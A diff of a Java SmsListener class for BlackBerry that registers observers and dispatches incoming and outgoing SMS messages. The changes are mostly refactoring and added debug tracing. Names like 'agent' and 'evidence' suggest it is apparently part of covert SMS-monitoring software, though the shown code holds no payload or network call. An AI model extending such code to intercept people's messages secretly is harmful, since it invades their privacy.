@@ -2,33 +2,20 @@
 package blackberry.agent.sms;
 
 import java.io.IOException;
-import java.io.UnsupportedEncodingException;
-import java.util.Date;
 import java.util.Vector;
 
 import javax.microedition.io.Connector;
-import javax.wireless.messaging.BinaryMessage;
 import javax.wireless.messaging.MessageConnection;
-import javax.wireless.messaging.TextMessage;
 
-import net.rim.blackberry.api.phone.Phone;
 import net.rim.device.api.system.RuntimeStore;
-import net.rim.device.api.util.DataBuffer;
 import blackberry.Listener;
-import blackberry.agent.MessageAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.evidence.EvidenceType;
-import blackberry.interfaces.BatteryStatusObserver;
 import blackberry.interfaces.SmsObserver;
 import blackberry.utils.Check;
-import blackberry.utils.DateTime;
-import blackberry.utils.Utils;
-import blackberry.utils.WChar;
 
 public class SmsListener {
 
-    
     private static final long GUID = 0xe78b740082783262L;
 
     //#ifdef DEBUG
@@ -36,7 +23,7 @@ public class SmsListener {
     //#endif
 
     Vector smsObservers = new Vector();
-    
+
     private MessageConnection smsconn;
     private Thread inThread;
     private SMSInOutListener inoutsms;
@@ -47,9 +34,10 @@ public class SmsListener {
     private SmsListener() {
     }
 
-   /* public void setMessageAgent(final MessageAgent messageAgent) {
-        this.messageAgent = messageAgent;
-    }*/
+    /*
+     * public void setMessageAgent(final MessageAgent messageAgent) {
+     * this.messageAgent = messageAgent; }
+     */
 
     public synchronized static SmsListener getInstance() {
 
@@ -65,24 +53,40 @@ public class SmsListener {
         return instance;
     }
 
-    public synchronized void addSmsObserver(
-            final SmsObserver observer) {
+    public synchronized void addSmsObserver(final SmsObserver observer) {
+        //#ifdef DEBUG
+        debug.trace("addSmsObserver");
+        //#endif
         Listener.addObserver(smsObservers, observer);
-        
-        if(!isRunning()){
+        //#ifdef DEBUG
+        debug.trace("addSmsObserver, total observers: " + smsObservers.size());
+        //#endif
+
+        if (!isRunning()) {
+            //#ifdef DEBUG
+            debug.trace("addSmsObserver, not running, so start");
+            //#endif
             start();
         }
     }
 
-    public synchronized void removeSmsObserver(
-            final SmsObserver observer) {
+    public synchronized void removeSmsObserver(final SmsObserver observer) {
+        //#ifdef DEBUG
+        debug.trace("removeSmsObserver");
+        //#endif
         Listener.removeObserver(smsObservers, observer);
-        
-        if(smsObservers.size()==0){
+        //#ifdef DEBUG
+        debug.trace("addSmsObserver, total observers: " + smsObservers.size());
+        //#endif
+
+        if (smsObservers.size() == 0) {
+            //#ifdef DEBUG
+            debug.trace("removeSmsObserver, no observer, so stop");
+            //#endif
             stop();
         }
     }
-    
+
     public synchronized boolean isRunning() {
         final boolean ret = smsconn != null;
 
@@ -159,7 +163,10 @@ public class SmsListener {
                 //#ifdef DEBUG
                 debug.trace("stop: smsconn");
                 //#endif
+
+                smsconn.setMessageListener(null);
                 smsconn.close();
+               
             }
             if (inoutsms != null) {
                 //#ifdef DEBUG
@@ -189,16 +196,20 @@ public class SmsListener {
             inoutsms = null;
             inThread = null;
         }
+
+        //#ifdef DBC
+        Check.ensures(!isRunning(), "Shouldn't be running, now");
+        //#endif
     }
 
     public void run() {
 
     }
-    
+
     synchronized boolean dispatch(
             final javax.wireless.messaging.Message message,
-            final boolean incoming){
-        
+            final boolean incoming) {
+
         final int size = smsObservers.size();
         for (int i = 0; i < size; i++) {
 
@@ -210,7 +221,7 @@ public class SmsListener {
 
             observer.onNewSms(message, incoming);
         }
-        
+
         return true;
         //return saveLog(message, incoming);
     }
